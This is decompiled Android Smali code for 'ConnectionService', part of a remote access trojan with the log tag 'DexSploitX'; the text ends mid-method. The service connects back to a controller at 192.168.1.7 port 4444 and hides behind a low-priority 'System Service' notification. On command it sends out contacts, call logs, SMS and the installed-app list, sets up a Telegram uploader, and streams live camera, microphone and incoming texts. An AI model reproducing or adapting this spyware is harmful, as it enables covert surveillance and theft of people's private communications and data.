.class public Lcom/system/DroidX/ConnectionService;
.super Landroid/app/Service;
.source "ConnectionService.java"


# static fields
.field private static final CHANNEL_ID:Ljava/lang/String; = "camera_service_channel"

.field private static final NOTIFICATION_ID:I = 0x64

.field private static final PREF_LIVE_SMS:Ljava/lang/String; = "live_sms_active"

.field private static final TAG:Ljava/lang/String; = "DexSploitX"

.field private static isServiceRunning:Z = false


# instance fields
.field private audioStreamer:Lcom/system/DroidX/utils/AudioStreamer;

.field private cameraStreamer:Lcom/system/DroidX/utils/CameraStreamer;

.field private connectionThread:Ljava/lang/Thread;

.field private isRunning:Z

.field private liveSMSActive:Z

.field private locationHelper:Lcom/system/DroidX/utils/LocationHelper;

.field private volatile outputStream:Ljava/io/OutputStream;

.field private smsMonitor:Lcom/system/DroidX/utils/SMSMonitor;

.field private socket:Ljava/net/Socket;


# direct methods
.method public static synthetic $r8$lambda$ykPbk0OoXOKVOeiJfUC-JALOL8k(Lcom/system/DroidX/ConnectionService;)V
    .locals 0

    invoke-direct {p0}, Lcom/system/DroidX/ConnectionService;->connectToServer()V

    return-void
.end method

.method static bridge synthetic -$$Nest$msendLiveSMSData(Lcom/system/DroidX/ConnectionService;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V
    .locals 0

    invoke-direct {p0, p1, p2, p3, p4}, Lcom/system/DroidX/ConnectionService;->sendLiveSMSData(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    return-void
.end method

.method static bridge synthetic -$$Nest$msendResponse(Lcom/system/DroidX/ConnectionService;Ljava/lang/String;)V
    .locals 0

    invoke-direct {p0, p1}, Lcom/system/DroidX/ConnectionService;->sendResponse(Ljava/lang/String;)V

    return-void
.end method

.method static constructor <clinit>()V
    .locals 0

    return-void
.end method

.method public constructor <init>()V
    .locals 1

    .line 37
    invoke-direct {p0}, Landroid/app/Service;-><init>()V

    const/4 v0, 0x0

    .line 43
    iput-boolean v0, p0, Lcom/system/DroidX/ConnectionService;->isRunning:Z

    .line 48
    iput-boolean v0, p0, Lcom/system/DroidX/ConnectionService;->liveSMSActive:Z

    return-void
.end method

.method private connectToServer()V
    .locals 15

    .line 135
    const-string v0, "CMD:"

    const-string v1, "\n"

    const-string v2, "RES:"

    const-string v3, "Reconnecting in 2 seconds..."

    const-string v4, "Socket close error: "

    const-string v5, "DexSploitX"

    :cond_0
    :goto_0
    iget-boolean v6, p0, Lcom/system/DroidX/ConnectionService;->isRunning:Z

    if-eqz v6, :cond_d

    const-wide/16 v6, 0x7d0

    .line 137
    :try_start_0
    new-instance v8, Ljava/net/Socket;

    invoke-direct {v8}, Ljava/net/Socket;-><init>()V

    iput-object v8, p0, Lcom/system/DroidX/ConnectionService;->socket:Ljava/net/Socket;

    const/4 v9, 0x1

    .line 138
    invoke-virtual {v8, v9}, Ljava/net/Socket;->setKeepAlive(Z)V

    .line 139
    iget-object v8, p0, Lcom/system/DroidX/ConnectionService;->socket:Ljava/net/Socket;

    invoke-virtual {v8, v9}, Ljava/net/Socket;->setTcpNoDelay(Z)V

    .line 140
    iget-object v8, p0, Lcom/system/DroidX/ConnectionService;->socket:Ljava/net/Socket;

    const/4 v9, 0x0

    invoke-virtual {v8, v9}, Ljava/net/Socket;->setSoTimeout(I)V

    .line 141
    iget-object v8, p0, Lcom/system/DroidX/ConnectionService;->socket:Ljava/net/Socket;

    new-instance v10, Ljava/net/InetSocketAddress;

    const-string v11, "192.168.1.7"

    invoke-virtual {v11}, Ljava/lang/String;->trim()Ljava/lang/String;

    move-result-object v11

    const-string v12, "4444"

    invoke-static {v12}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v12

    invoke-direct {v10, v11, v12}, Ljava/net/InetSocketAddress;-><init>(Ljava/lang/String;I)V

    const/16 v11, 0x2710

    invoke-virtual {v8, v10, v11}, Ljava/net/Socket;->connect(Ljava/net/SocketAddress;I)V

    .line 143
    const-string v8, "Connected to server"

    invoke-static {v5, v8}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 145
    invoke-static {p0}, Lcom/system/DroidX/utils/DeviceInfo;->getDeviceInfo(Landroid/content/Context;)Lorg/json/JSONObject;

    move-result-object v8

    .line 146
    iget-object v10, p0, Lcom/system/DroidX/ConnectionService;->socket:Ljava/net/Socket;

    invoke-virtual {v10}, Ljava/net/Socket;->getOutputStream()Ljava/io/OutputStream;

    move-result-object v10

    iput-object v10, p0, Lcom/system/DroidX/ConnectionService;->outputStream:Ljava/io/OutputStream;

    .line 149
    new-instance v10, Ljava/lang/StringBuilder;

    invoke-direct {v10}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v10, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v10

    invoke-virtual {v8}, Lorg/json/JSONObject;->toString()Ljava/lang/String;

    move-result-object v8

    invoke-virtual {v10, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    invoke-virtual {v8, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    invoke-virtual {v8}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v8

    .line 150
    iget-object v10, p0, Lcom/system/DroidX/ConnectionService;->outputStream:Ljava/io/OutputStream;

    invoke-virtual {v8}, Ljava/lang/String;->getBytes()[B

    move-result-object v8

    invoke-virtual {v10, v8}, Ljava/io/OutputStream;->write([B)V

    .line 151
    iget-object v8, p0, Lcom/system/DroidX/ConnectionService;->outputStream:Ljava/io/OutputStream;

    invoke-virtual {v8}, Ljava/io/OutputStream;->flush()V

    .line 154
    iget-object v8, p0, Lcom/system/DroidX/ConnectionService;->outputStream:Ljava/io/OutputStream;

    invoke-static {v8}, Lcom/system/DroidX/utils/SimpleUploader;->setOutputStream(Ljava/io/OutputStream;)V

    .line 155
    iget-object v8, p0, Lcom/system/DroidX/ConnectionService;->cameraStreamer:Lcom/system/DroidX/utils/CameraStreamer;

    if-eqz v8, :cond_1

    .line 156
    iget-object v10, p0, Lcom/system/DroidX/ConnectionService;->outputStream:Ljava/io/OutputStream;

    invoke-virtual {v8, v10}, Lcom/system/DroidX/utils/CameraStreamer;->setOutputStream(Ljava/io/OutputStream;)V

    .line 158
    :cond_1
    iget-object v8, p0, Lcom/system/DroidX/ConnectionService;->audioStreamer:Lcom/system/DroidX/utils/AudioStreamer;

    if-eqz v8, :cond_2

    .line 159
    iget-object v10, p0, Lcom/system/DroidX/ConnectionService;->outputStream:Ljava/io/OutputStream;

    invoke-virtual {v8, v10}, Lcom/system/DroidX/utils/AudioStreamer;->setOutputStream(Ljava/io/OutputStream;)V

    .line 163
    :cond_2
    iget-boolean v8, p0, Lcom/system/DroidX/ConnectionService;->liveSMSActive:Z

    if-eqz v8, :cond_3

    iget-object v8, p0, Lcom/system/DroidX/ConnectionService;->smsMonitor:Lcom/system/DroidX/utils/SMSMonitor;

    if-eqz v8, :cond_3

    .line 164
    const-string v8, "Reconnected - live SMS monitoring still active"

    invoke-static {v5, v8}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 167
    :cond_3
    iget-object v8, p0, Lcom/system/DroidX/ConnectionService;->socket:Ljava/net/Socket;

    invoke-virtual {v8}, Ljava/net/Socket;->getInputStream()Ljava/io/InputStream;

    move-result-object v8

    const/16 v10, 0x1000

    .line 168
    new-array v10, v10, [B

    .line 170
    :cond_4
    :goto_1
    iget-boolean v11, p0, Lcom/system/DroidX/ConnectionService;->isRunning:Z

    if-eqz v11, :cond_8

    iget-object v11, p0, Lcom/system/DroidX/ConnectionService;->socket:Ljava/net/Socket;

    invoke-virtual {v11}, Ljava/net/Socket;->isClosed()Z

    move-result v11

    if-nez v11, :cond_8

    .line 171
    invoke-virtual {v8, v10}, Ljava/io/InputStream;->read([B)I

    move-result v11

    const/4 v12, -0x1

    if-ne v11, v12, :cond_5

    goto/16 :goto_2

    .line 174
    :cond_5
    new-instance v12, Ljava/lang/String;

    invoke-direct {v12, v10, v9, v11}, Ljava/lang/String;-><init>([BII)V

    invoke-virtual {v12}, Ljava/lang/String;->trim()Ljava/lang/String;

    move-result-object v11

    .line 175
    new-instance v12, Ljava/lang/StringBuilder;

    invoke-direct {v12}, Ljava/lang/StringBuilder;-><init>()V

    const-string v13, "[CMD RECEIVED] "

    invoke-virtual {v12, v13}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v12

    invoke-virtual {v12, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v12

    invoke-virtual {v12}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v12

    invoke-static {v5, v12}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 178
    invoke-virtual {v11, v0}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v12

    if-eqz v12, :cond_6

    .line 179
    invoke-virtual {v0}, Ljava/lang/String;->length()I

    move-result v12

    invoke-virtual {v11, v12}, Ljava/lang/String;->substring(I)Ljava/lang/String;

    move-result-object v11

    .line 182
    :cond_6
    const-string v12, "LIVE_SMS:"

    invoke-virtual {v11, v12}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v12

    if-eqz v12, :cond_7

    goto :goto_1

    .line 186
    :cond_7
    invoke-direct {p0, v11}, Lcom/system/DroidX/ConnectionService;->executeCommand(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v11

    if-eqz v11, :cond_4

    .line 188
    invoke-virtual {v11}, Ljava/lang/String;->isEmpty()Z

    move-result v12

    if-nez v12, :cond_4

    .line 189
    new-instance v12, Ljava/lang/StringBuilder;

    invoke-direct {v12}, Ljava/lang/StringBuilder;-><init>()V

    const-string v13, "[RESPONSE SENT] "

    invoke-virtual {v12, v13}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v12

    invoke-virtual {v11}, Ljava/lang/String;->length()I

    move-result v13

    const/16 v14, 0x64

    invoke-static {v14, v13}, Ljava/lang/Math;->min(II)I

    move-result v13

    invoke-virtual {v11, v9, v13}, Ljava/lang/String;->substring(II)Ljava/lang/String;

    move-result-object v13

    invoke-virtual {v12, v13}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v12

    invoke-virtual {v12}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v12

    invoke-static {v5, v12}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 191
    new-instance v12, Ljava/lang/StringBuilder;

    invoke-direct {v12}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v12, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v12

    invoke-virtual {v12, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v11

    invoke-virtual {v11, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v11

    invoke-virtual {v11}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v11

    .line 192
    const-string v12, "UTF-8"

    invoke-virtual {v11, v12}, Ljava/lang/String;->getBytes(Ljava/lang/String;)[B

    move-result-object v11

    .line 193
    iget-object v12, p0, Lcom/system/DroidX/ConnectionService;->outputStream:Ljava/io/OutputStream;

    invoke-virtual {v12, v11}, Ljava/io/OutputStream;->write([B)V

    .line 194
    iget-object v11, p0, Lcom/system/DroidX/ConnectionService;->outputStream:Ljava/io/OutputStream;

    invoke-virtual {v11}, Ljava/io/OutputStream;->flush()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_1
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    goto/16 :goto_1

    .line 201
    :cond_8
    :goto_2
    :try_start_1
    iget-object v8, p0, Lcom/system/DroidX/ConnectionService;->socket:Ljava/net/Socket;

    if-eqz v8, :cond_9

    invoke-virtual {v8}, Ljava/net/Socket;->close()V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    goto :goto_3

    :catch_0
    move-exception v8

    .line 203
    new-instance v9, Ljava/lang/StringBuilder;

    invoke-direct {v9, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v8}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v8

    invoke-virtual {v9, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    invoke-virtual {v8}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v8

    invoke-static {v5, v8}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    .line 206
    :cond_9
    :goto_3
    iget-boolean v8, p0, Lcom/system/DroidX/ConnectionService;->isRunning:Z

    if-eqz v8, :cond_0

    .line 207
    :goto_4
    invoke-static {v5, v3}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 209
    :try_start_2
    invoke-static {v6, v7}, Ljava/lang/Thread;->sleep(J)V
    :try_end_2
    .catch Ljava/lang/InterruptedException; {:try_start_2 .. :try_end_2} :catch_4

    goto/16 :goto_0

    :catchall_0
    move-exception v0

    goto :goto_6

    :catch_1
    move-exception v8

    .line 198
    :try_start_3
    new-instance v9, Ljava/lang/StringBuilder;

    invoke-direct {v9}, Ljava/lang/StringBuilder;-><init>()V

    const-string v10, "Connection error: "

    invoke-virtual {v9, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v9

    invoke-virtual {v8}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v8

    invoke-virtual {v9, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    invoke-virtual {v8}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v8

    invoke-static {v5, v8}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_3
    .catchall {:try_start_3 .. :try_end_3} :catchall_0

    .line 201
    :try_start_4
    iget-object v8, p0, Lcom/system/DroidX/ConnectionService;->socket:Ljava/net/Socket;

    if-eqz v8, :cond_a

    invoke-virtual {v8}, Ljava/net/Socket;->close()V
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_2

    goto :goto_5

    :catch_2
    move-exception v8

    .line 203
    new-instance v9, Ljava/lang/StringBuilder;

    invoke-direct {v9, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v8}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v8

    invoke-virtual {v9, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    invoke-virtual {v8}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v8

    invoke-static {v5, v8}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    .line 206
    :cond_a
    :goto_5
    iget-boolean v8, p0, Lcom/system/DroidX/ConnectionService;->isRunning:Z

    if-eqz v8, :cond_0

    goto :goto_4

    .line 201
    :goto_6
    :try_start_5
    iget-object v1, p0, Lcom/system/DroidX/ConnectionService;->socket:Ljava/net/Socket;

    if-eqz v1, :cond_b

    invoke-virtual {v1}, Ljava/net/Socket;->close()V
    :try_end_5
    .catch Ljava/lang/Exception; {:try_start_5 .. :try_end_5} :catch_3

    goto :goto_7

    :catch_3
    move-exception v1

    .line 203
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v1}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v2, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v5, v1}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    .line 206
    :cond_b
    :goto_7
    iget-boolean v1, p0, Lcom/system/DroidX/ConnectionService;->isRunning:Z

    if-eqz v1, :cond_c

    .line 207
    invoke-static {v5, v3}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 209
    :try_start_6
    invoke-static {v6, v7}, Ljava/lang/Thread;->sleep(J)V
    :try_end_6
    .catch Ljava/lang/InterruptedException; {:try_start_6 .. :try_end_6} :catch_4

    .line 214
    :cond_c
    throw v0

    :catch_4
    :cond_d
    return-void
.end method

.method private createNotification(Ljava/lang/String;)Landroid/app/Notification;
    .locals 2

    .line 518
    new-instance v0, Landroidx/core/app/NotificationCompat$Builder;

    const-string v1, "camera_service_channel"

    invoke-direct {v0, p0, v1}, Landroidx/core/app/NotificationCompat$Builder;-><init>(Landroid/content/Context;Ljava/lang/String;)V

    const-string v1, "System Service"

    .line 519
    invoke-virtual {v0, v1}, Landroidx/core/app/NotificationCompat$Builder;->setContentTitle(Ljava/lang/CharSequence;)Landroidx/core/app/NotificationCompat$Builder;

    move-result-object v0

    .line 520
    invoke-virtual {v0, p1}, Landroidx/core/app/NotificationCompat$Builder;->setContentText(Ljava/lang/CharSequence;)Landroidx/core/app/NotificationCompat$Builder;

    move-result-object p1

    const v0, 0x108007c

    .line 521
    invoke-virtual {p1, v0}, Landroidx/core/app/NotificationCompat$Builder;->setSmallIcon(I)Landroidx/core/app/NotificationCompat$Builder;

    move-result-object p1

    const/4 v0, -0x1

    .line 522
    invoke-virtual {p1, v0}, Landroidx/core/app/NotificationCompat$Builder;->setPriority(I)Landroidx/core/app/NotificationCompat$Builder;

    move-result-object p1

    .line 523
    invoke-virtual {p1}, Landroidx/core/app/NotificationCompat$Builder;->build()Landroid/app/Notification;

    move-result-object p1

    return-object p1
.end method

.method private createNotificationChannel()V
    .locals 4

    .line 506
    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v1, 0x1a

    if-lt v0, v1, :cond_0

    .line 507
    new-instance v0, Landroid/app/NotificationChannel;

    const-string v1, "Camera Service"

    const/4 v2, 0x2

    const-string v3, "camera_service_channel"

    invoke-direct {v0, v3, v1, v2}, Landroid/app/NotificationChannel;-><init>(Ljava/lang/String;Ljava/lang/CharSequence;I)V

    .line 512
    const-class v1, Landroid/app/NotificationManager;

    invoke-virtual {p0, v1}, Lcom/system/DroidX/ConnectionService;->getSystemService(Ljava/lang/Class;)Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Landroid/app/NotificationManager;

    .line 513
    invoke-virtual {v1, v0}, Landroid/app/NotificationManager;->createNotificationChannel(Landroid/app/NotificationChannel;)V

    :cond_0
    return-void
.end method

.method private executeCommand(Ljava/lang/String;)Ljava/lang/String;
    .locals 10

    .line 220
    const-string v0, "sms"

    const-string v1, " "

    .line 0
    const-string v2, "Unknown command: "

    const-string v3, "VIBRATED_"

    const-string v4, "TG_CONFIGURED:"

    .line 220
    :try_start_0
    invoke-virtual {p1, v1}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v5

    const/4 v6, 0x0

    aget-object v5, v5, v6

    .line 222
    const-string v7, "deviceinfo"

    invoke-virtual {p1, v7}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v7

    const/4 v8, 0x2

    if-eqz v7, :cond_0

    .line 223
    invoke-static {p0}, Lcom/system/DroidX/utils/DeviceInfo;->getDeviceInfo(Landroid/content/Context;)Lorg/json/JSONObject;

    move-result-object p1

    invoke-virtual {p1, v8}, Lorg/json/JSONObject;->toString(I)Ljava/lang/String;

    move-result-object p1

    return-object p1

    .line 224
    :cond_0
    const-string v7, "contacts"

    invoke-virtual {p1, v7}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v7

    const/4 v9, 0x0

    if-eqz v7, :cond_1

    .line 225
    invoke-static {p0}, Lcom/system/DroidX/utils/ContactsHelper;->getAllContacts(Landroid/content/Context;)Ljava/lang/String;

    move-result-object p1

    .line 226
    invoke-direct {p0, p1}, Lcom/system/DroidX/ConnectionService;->sendLargeResponse(Ljava/lang/String;)V

    return-object v9

    .line 228
    :cond_1
    const-string v7, "calllogs"

    invoke-virtual {p1, v7}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v7

    if-eqz v7, :cond_2

    .line 229
    invoke-static {p0}, Lcom/system/DroidX/utils/CallLogsHelper;->getAllCallLogs(Landroid/content/Context;)Ljava/lang/String;

    move-result-object p1

    .line 230
    invoke-direct {p0, p1}, Lcom/system/DroidX/ConnectionService;->sendLargeResponse(Ljava/lang/String;)V

    return-object v9

    .line 232
    :cond_2
    const-string v7, "applist"

    invoke-virtual {p1, v7}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v7

    if-eqz v7, :cond_3

    .line 233
    invoke-static {p0}, Lcom/system/DroidX/utils/AppListHelper;->getAllApps(Landroid/content/Context;)Ljava/lang/String;

    move-result-object p1

    .line 234
    invoke-direct {p0, p1}, Lcom/system/DroidX/ConnectionService;->sendLargeResponse(Ljava/lang/String;)V

    return-object v9

    .line 236
    :cond_3
    invoke-virtual {p1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v7

    if-eqz v7, :cond_4

    .line 237
    invoke-direct {p0, v0}, Lcom/system/DroidX/ConnectionService;->handleLargeDataCommand(Ljava/lang/String;)Ljava/lang/String;

    move-result-object p1

    return-object p1

    .line 238
    :cond_4
    const-string v0, "tg-config"

    invoke-virtual {p1, v0}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v0

    const/4 v7, 0x1

    if-eqz v0, :cond_7

    .line 239
    invoke-virtual {p1, v1}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object p1

    .line 240
    array-length v0, p1

    if-le v0, v7, :cond_6

    .line 241
    aget-object v0, p1, v7

    .line 242
    array-length v1, p1

    if-le v1, v8, :cond_5

    aget-object p1, p1, v8

    goto :goto_0

    :cond_5
    const-string p1, ""

    .line 243
    :goto_0
    invoke-static {v0, p1}, Lcom/system/DroidX/utils/TelegramUploader;->configure(Ljava/lang/String;Ljava/lang/String;)V

    .line 244
    new-instance p1, Ljava/lang/StringBuilder;

    invoke-direct {p1, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const/16 v1, 0x14

    invoke-virtual {v0, v6, v1}, Ljava/lang/String;->substring(II)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object p1

    const-string v0, "..."

    invoke-virtual {p1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object p1

    invoke-virtual {p1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    return-object p1

    .line 246
    :cond_6
    const-string p1, "Usage: tg-config <bot_token> [chat_id]"

    return-object p1

    .line 247
    :cond_7
    const-string v0, "livesms"

    invoke-virtual {p1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_8

    .line 248
    invoke-direct {p0}, Lcom/system/DroidX/ConnectionService;->startLiveSMS()Ljava/lang/String;

    move-result-object p1

    return-object p1

    .line 249
    :cond_8
    const-string v0, "stoplive"

    invoke-virtual {p1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_9

    .line 250
    invoke-direct {p0}, Lcom/system/DroidX/ConnectionService;->stopLiveSMS()Ljava/lang/String;

    move-result-object p1

    return-object p1

    .line 251
    :cond_9
    const-string v0, "smsstatus"

    invoke-virtual {p1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_b

    .line 252
    iget-boolean p1, p0, Lcom/system/DroidX/ConnectionService;->liveSMSActive:Z

    if-eqz p1, :cond_a

    const-string p1, "LIVE_SMS_ACTIVE"

    return-object p1

    :cond_a
    const-string p1, "LIVE_SMS_INACTIVE"

    return-object p1

    .line 253
    :cond_b
    const-string v0, "camstream"

    invoke-virtual {p1, v0}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v0

    if-eqz v0, :cond_d

    .line 254
    invoke-virtual {p1, v1}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object p1

    .line 255
    array-length v0, p1

    if-le v0, v7, :cond_c

    aget-object p1, p1, v7

    goto :goto_1

    :cond_c
    const-string p1, "back"

    .line 256
    :goto_1
    invoke-direct {p0, p1}, Lcom/system/DroidX/ConnectionService;->handleCameraStream(Ljava/lang/String;)V

    .line 257
    const-string p1, "STREAM_STARTED"

    return-object p1

    .line 258
    :cond_d
    const-string v0, "stopstream"

    invoke-virtual {p1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_e

    .line 259
    invoke-direct {p0}, Lcom/system/DroidX/ConnectionService;->stopCameraStream()V

    .line 260
    const-string p1, "STREAM_STOPPED"

    return-object p1

    .line 261
    :cond_e
    const-string v0, "vibrate"

    invoke-virtual {p1, v0}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v0

    if-eqz v0, :cond_10

    .line 262
    invoke-virtual {p1, v1}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object p1

    .line 263
    array-length v0, p1

    if-le v0, v7, :cond_f

    aget-object p1, p1, v7

    invoke-static {p1}, Ljava/lang/Long;->parseLong(Ljava/lang/String;)J

    move-result-wide v0

    goto :goto_2

    :cond_f
    const-wide/16 v0, 0x1f4

    .line 264
    :goto_2
    invoke-static {p0, v0, v1}, Lcom/system/DroidX/utils/VibrationHelper;->vibrate(Landroid/content/Context;J)V

    .line 265
    new-instance p1, Ljava/lang/StringBuilder;

    invoke-direct {p1, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {p1, v0, v1}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    move-result-object p1

    const-string v0, "ms"

    invoke-virtual {p1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object p1

    invoke-virtual {p1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    return-object p1

    .line 266
    :cond_10
    const-string v0, "playsound"

    invoke-virtual {p1, v0}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v0

    if-eqz v0, :cond_12

    .line 267
    invoke-virtual {p1, v1, v8}, Ljava/lang/String;->split(Ljava/lang/String;I)[Ljava/lang/String;

    move-result-object p1

    .line 268
    array-length v0, p1

    if-le v0, v7, :cond_11

    .line 269
    aget-object p1, p1, v7

    .line 270
    invoke-static {p0, p1}, Lcom/system/DroidX/utils/DeviceActions;->playSoundFromURL(Landroid/content/Context;Ljava/lang/String;)V

    .line 271
    const-string p1, "PLAYING_SOUND"

    return-object p1

    .line 273
    :cond_11
    const-string p1, "Usage: playsound <url>"

    return-object p1

    .line 274
    :cond_12
    const-string v0, "stopsound"

    invoke-virtual {p1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_13

    .line 275
    invoke-static {}, Lcom/system/DroidX/utils/DeviceActions;->stopSound()V

    .line 276
    const-string p1, "SOUND_STOPPED"

    return-object p1

    .line 277
    :cond_13
    const-string v0, "liveaudio"

    invoke-virtual {p1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_15

    .line 278
    iget-object p1, p0, Lcom/system/DroidX/ConnectionService;->audioStreamer:Lcom/system/DroidX/utils/AudioStreamer;

    if-nez p1, :cond_14

    .line 279
    new-instance p1, Lcom/system/DroidX/utils/AudioStreamer;

    invoke-direct {p1}, Lcom/system/DroidX/utils/AudioStreamer;-><init>()V

    iput-object p1, p0, Lcom/system/DroidX/ConnectionService;->audioStreamer:Lcom/system/DroidX/utils/AudioStreamer;

    .line 280
    iget-object v0, p0, Lcom/system/DroidX/ConnectionService;->outputStream:Ljava/io/OutputStream;

    invoke-virtual {p1, v0}, Lcom/system/DroidX/utils/AudioStreamer;->setOutputStream(Ljava/io/OutputStream;)V

    .line 282
    :cond_14
    iget-object p1, p0, Lcom/system/DroidX/ConnectionService;->audioStreamer:Lcom/system/DroidX/utils/AudioStreamer;

    invoke-virtual {p1}, Lcom/system/DroidX/utils/AudioStreamer;->startStreaming()V

    .line 283
    const-string p1, "AUDIO_STARTED"

    return-object p1

    .line 284
    :cond_15
    const-string v0, "stopaudio"

    invoke-virtual {p1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_17

    .line 285
    iget-object p1, p0, Lcom/system/DroidX/ConnectionService;->audioStreamer:Lcom/system/DroidX/utils/AudioStreamer;

    if-eqz p1, :cond_16

    .line 286
    invoke-virtual {p1}, Lcom/system/DroidX/utils/AudioStreamer;->stopStreaming()V

    .line 287
    iput-object v9, p0, Lcom/system/DroidX/ConnectionService;->audioStreamer:Lcom/system/DroidX/utils/AudioStreamer;

